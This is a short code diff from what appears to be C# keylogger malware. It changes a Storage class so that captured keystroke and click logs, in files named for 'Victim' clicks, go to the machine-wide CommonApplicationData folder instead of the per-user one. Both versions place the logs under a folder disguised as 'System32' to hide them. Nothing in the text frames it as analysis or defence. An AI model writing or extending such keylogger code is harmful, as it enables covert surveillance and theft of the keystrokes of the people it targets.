@@ -2,11 +2,11 @@
 {
     internal class Storage
     {
-        private static string AppDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32";
-        public static string BaseKeylogLogsFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\";
-        private static string AllVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\AllClicks.txt";
-        private static string OnlyKeyPressVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\OnlyKeyPressClicks.txt";
-        public static string KeyLogerCopyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\Copy\\";
+        private static string AppDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\System32";
+        public static string BaseKeylogLogsFilePath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\System32\\KeyLog\\";
+        private static string AllVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\System32\\KeyLog\\AllClicks.txt";
+        private static string OnlyKeyPressVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\System32\\KeyLog\\OnlyKeyPressClicks.txt";
+        public static string KeyLogerCopyPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\System32\\KeyLog\\Copy\\";
         internal Storage()
         {
             // Ensure the directory exists
